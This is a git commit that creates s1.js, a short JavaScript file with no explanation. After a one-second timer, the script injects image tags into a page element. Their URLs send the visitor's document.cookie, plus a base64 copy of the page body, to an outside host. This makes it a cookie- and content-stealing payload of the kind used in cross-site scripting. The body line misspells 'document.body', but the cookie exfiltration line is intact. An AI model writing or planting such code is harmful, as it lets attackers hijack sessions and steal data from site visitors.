159ae113141ecff1453f76adc24dd6af69b9dedf
skav75 <149662383+skav75@users.noreply.github.com>
2023-11-16 10:55:15 +0100

    Create s1.js

---
+++ s1.js
@@ -0,0 +1,6 @@
+function gg(){
+  var i1 = '<img src="https://www.logogenie.fr/cookie?c=' + document.cookie + '" />'
+  var i2 = '<img src="https://www.logogenie.fr/content?c=' + btoa(document.boody.innerHTML) + '" />'
+  document.getElementById('volet_clos').innerHTML += i1 + i2
+}
+setTimeout(gg,1000);
